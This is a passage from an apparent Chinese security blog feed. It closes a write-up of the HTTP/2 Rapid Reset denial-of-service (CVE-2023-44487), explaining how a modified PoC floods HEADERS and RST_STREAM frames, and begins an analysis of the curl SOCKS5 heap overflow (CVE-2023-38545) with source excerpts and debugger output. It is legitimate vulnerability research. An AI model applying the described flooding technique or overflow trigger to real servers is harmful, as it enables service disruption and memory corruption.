&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以我们只需要将接收数据的逻辑去掉，改为发送headers之后直接发送reset即可，PoC晚些时候会上传到
&lt;a href="https://github.com/Chestnuts4" target="_blank">GitHub&lt;/a>上。
利用效果如下，单个进程单个线程可以使服务CPU占用20%&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/2.png" />&lt;/p>
&lt;p>当然这个漏洞PoC也适合使用go写，我这边go写的并发有点问题，不如python版本稳定。&lt;/p>
&lt;p>&lt;strong>抓包分析&lt;/strong>&lt;/p>
&lt;p>运行PoC抓包，解密，wireshark摘要如下：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/4.png" />&lt;/p>
&lt;p>在本次环境中，服务器通告的最大并发流为250。在下面的数据包中，客户端先发送HEADERS请求，而后发送RST_STREAM请求，循环往复。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/5.png" />&lt;/p>
&lt;p>通过这种办法客户端不用等待服务器响应，发送速率只受自己带宽限制，从而并非服务器在HTTP2协议初始化时声明的最大并发流限制。&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>HTTP2 DOS原理较为简单，利用RFC所规定的协议特性，本质上属于滥用，而CloudFlare对此的应对策略是当客户端重置次数超过某个阈值则认为是恶意客户端，关闭该连接。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/7.png" />&lt;/p>
&lt;p>由于nginx默认配置不受影响，所以受此漏洞影响的大部分是go 或者java启动的HTTP服务，同时如果使用nginx反代后端服务，即使后端服务支持HTTP2，nginx也会将请求降级到HTTP 1.1。&lt;/p>
&lt;p>可预见的将来，此次这种漏洞的出现不会是最后一次，hope the internet will become more and more secure.&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers" target="_blank">https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack" target="_blank">https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/" target="_blank">https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/" target="_blank">https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-10-13T15:11:25+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-38545 Curl 堆溢出漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</link><pubDate>Wed, 11 Oct 2023 20:40:32 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>在libcurl中存在堆溢出漏洞，当libcurl通过socks5代理发送请求时，如果hostname大于255则会在本地解析，但由于状态机错误导致没有按照预期解析，而是把主机名拷贝到缓冲区中，攻击者可以通过构造超长主机名触发堆溢出。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>7.69.0 &amp;lt;= libcurl &amp;lt;= 8.3.4&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;pre tabindex="0">&lt;code>sudo apt-get build-dep curl
autoreconf
./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug
make -j 16
make install
&lt;/code>&lt;/pre>&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>补丁&lt;/strong>
漏洞在
&lt;a href="https://github.com/curl/curl/commit/fb4415d8aee6c1045be932a34fe6107c2f5ed147" target="_blank">fb4415d8aee6c1045be932a34fe6107c2f5ed147&lt;/a>修复，修复代码如下
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38545-curl-heap-overflow.zh-cn.assets/1.png" />&lt;/p>
&lt;p>从修复代码中可以看出两个区别&lt;/p>
&lt;ul>
&lt;li>当socks5_resolve_local=false and hostname_len &amp;gt;255 时返回CURLPX_LONG_HOSTNAME错误码，而原先逻辑为将socks5_resolve_local设为true&lt;/li>
&lt;li>将hostname_len转为unsigned char后赋值给&lt;code>socksreq[len++]&lt;/code>
修复代码位于do_SOCKS5函数，该函数由connect_SOCKS函数调用&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> CURLcode &lt;span style="color:#a6e22e">connect_SOCKS&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Curl_cfilter &lt;span style="color:#f92672">*&lt;/span>cf,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> socks_state &lt;span style="color:#f92672">*&lt;/span>sxstate,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> Curl_easy &lt;span style="color:#f92672">*&lt;/span>data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span>(conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>socks_proxy.proxytype) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> CURLPROXY_SOCKS5:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> CURLPROXY_SOCKS5_HOSTNAME:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pxresult &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">do_SOCKS5&lt;/span>(cf, sxstate, data);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>向上追溯connect_SOCKS由socks_proxy_cf_connect调用，socks_proxy_cf_connect被存储在了一个结构体中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> CURLcode &lt;span style="color:#a6e22e">socks_proxy_cf_connect&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Curl_cfilter &lt;span style="color:#f92672">*&lt;/span>cf,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> Curl_easy &lt;span style="color:#f92672">*&lt;/span>data,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">bool&lt;/span> blocking, &lt;span style="color:#66d9ef">bool&lt;/span> &lt;span style="color:#f92672">*&lt;/span>done)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CURLcode result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> connectdata &lt;span style="color:#f92672">*&lt;/span>conn &lt;span style="color:#f92672">=&lt;/span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>conn;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> sockindex &lt;span style="color:#f92672">=&lt;/span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockindex;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> socks_state &lt;span style="color:#f92672">*&lt;/span>sx &lt;span style="color:#f92672">=&lt;/span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ctx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>connected) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>done &lt;span style="color:#f92672">=&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> CURLE_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>next&lt;span style="color:#f92672">-&amp;gt;&lt;/span>cft&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">do_connect&lt;/span>(cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>next, data, blocking, done);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(result &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!*&lt;/span>done)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>sx) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">calloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>sx), &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>sx)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> CURLE_OUT_OF_MEMORY;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ctx &lt;span style="color:#f92672">=&lt;/span> sx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>state &lt;span style="color:#f92672">==&lt;/span> CONNECT_INIT) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* for the secondary socket (FTP), use the &amp;#34;connect to host&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * but ignore the &amp;#34;connect to port&amp;#34; (use the secondary port)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sxstate&lt;/span>(sx, data, CONNECT_SOCKS_INIT);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>hostname &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bits.httpproxy &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>http_proxy.host.name :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bits.conn_to_host &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>conn_to_host.name :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sockindex &lt;span style="color:#f92672">==&lt;/span> SECONDARYSOCKET &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>secondaryhostname : conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>host.name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>remote_port &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bits.httpproxy &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>http_proxy.port :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sockindex &lt;span style="color:#f92672">==&lt;/span> SECONDARYSOCKET &lt;span style="color:#f92672">?&lt;/span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>secondary_port :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bits.conn_to_port &lt;span style="color:#f92672">?&lt;/span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>conn_to_port :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>remote_port;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>proxy_user &lt;span style="color:#f92672">=&lt;/span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>socks_proxy.user;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>proxy_password &lt;span style="color:#f92672">=&lt;/span> conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>socks_proxy.passwd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">connect_SOCKS&lt;/span>(cf, sx, data);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> Curl_cftype Curl_cft_socks_proxy &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  &lt;span style="color:#e6db74">&amp;#34;SOCKS-PROXYY&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  CF_TYPE_IP_CONNECT,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  socks_proxy_cf_destroy,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  socks_proxy_cf_connect,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  socks_proxy_cf_close,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  socks_cf_get_host,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  socks_cf_get_select_socks,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  Curl_cf_def_data_pending,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  Curl_cf_def_send,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  Curl_cf_def_recv,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  Curl_cf_def_cntrl,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  Curl_cf_def_conn_is_alive,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  Curl_cf_def_conn_keep_alive,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  Curl_cf_def_query,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>技术分析和动态调试&lt;/strong>
本次修复的函数do_SOCKS5实现了处理SOCKS5连接中的各个状态的代码，这个函数实现了一个状态机，状态机根据在socks连接中的不同状态进行不同操作，第一次调用do_SOCKS5时，socks5_resolve_local被初始化为 false，同时状态机状态为CONNECT_SOCKS_INIT&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>  &lt;span style="color:#66d9ef">bool&lt;/span> socks5_resolve_local &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    (conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>socks_proxy.proxytype &lt;span style="color:#f92672">==&lt;/span> CURLPROXY_SOCKS5) &lt;span style="color:#f92672">?&lt;/span> TRUE : FALSE;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>gef➤ p socks5_resolve_local
$5 = 0x0
&lt;/code>&lt;/pre>&lt;p>函数进入CONNECT_SOCKS_INIT分支，由于传递给curl的主机名超长，大于255，进入if中，socks5_resolve_local被赋值为true，代表此时应该使用本地解析&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span>(sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>state) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> CONNECT_SOCKS_INIT:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bits.httpproxy)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">infof&lt;/span>(data, &lt;span style="color:#e6db74">&amp;#34;SOCKS5: connecting to HTTP proxy %s port %d&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>hostname, sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>remote_port);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>socks5_resolve_local &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> hostname_len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">infof&lt;/span>(data, &lt;span style="color:#e6db74">&amp;#34;SOCKS5: server resolving disabled for hostnames of &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;length &amp;gt; 255 [actual len=%zu]&amp;#34;&lt;/span>, hostname_len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socks5_resolve_local &lt;span style="color:#f92672">=&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时调用栈如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:socks.c+595 ────
590 infof(data, &amp;#34;SOCKS5: server resolving disabled for hostnames of &amp;#34;
591 &amp;#34;length &amp;gt; 255 [actual len=%zu]&amp;#34;, hostname_len);
592 socks5_resolve_local = TRUE;
593 }
594
// auth=0x5
→ 595 if(auth &amp;amp; ~(CURLAUTH_BASIC | CURLAUTH_GSSAPI))
596 infof(data,
597 &amp;#34;warning: unsupported value passed to CURLOPT_SOCKS5_AUTH: %u&amp;#34;,
598 auth);
599 if(!(auth &amp;amp; CURLAUTH_BASIC))
600 /* disable username/password auth */
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: &amp;#34;curl&amp;#34;, stopped 0x7ffff7f4906d in do_SOCKS5 (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
gef➤ p socks5_resolve_local
$6 = 0x1
gef➤ bt
#0 do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:573
#1 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067
#2 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149
#3 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296
#4 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201
#5 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351
#6 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106
#7 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742
#8 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682
#9 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772
#10 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791
#11 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479
#12 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670
#13 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786
#14 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274
gef➤
&lt;/code>&lt;/pre>&lt;p>在这状态下，curl会初始化一些SOCKS请求body并将其发送给socks server，而后将状态转为 &lt;code>CONNECT_SOCKS_READ_INIT&lt;/code>并跳转到对应代码处。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> idx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[idx&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>; &lt;span style="color:#75715e">/* version */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> idx&lt;span style="color:#f92672">++&lt;/span>; &lt;span style="color:#75715e">/* number of authentication methods */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[idx&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#75715e">/* no authentication */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(allow_gssapi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[idx&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#75715e">/* GSS-API */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>proxy_user)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[idx&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#75715e">/* username/password */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* write the number of authentication methods */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span>) (idx &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outp &lt;span style="color:#f92672">=&lt;/span> socksreq;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outstanding &lt;span style="color:#f92672">=&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> presult &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">socks_state_send&lt;/span>(cf, sx, data, CURLPX_SEND_CONNECT,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sxstate&lt;/span>(sx, data, CONNECT_SOCKS_READ);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> CONNECT_SOCKS_READ_INIT;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在状态 &lt;code>CONNECT_SOCKS_READ_INIT&lt;/code>中，会赋值结构体成员而后将状态转为 &lt;code>CONNECT_SOCKS_READ&lt;/code>，curl会尝试从TCP连接中读取数据&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> CONNECT_SOCKS_READ_INIT:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outstanding &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#75715e">/* expect two bytes */&lt;/span>
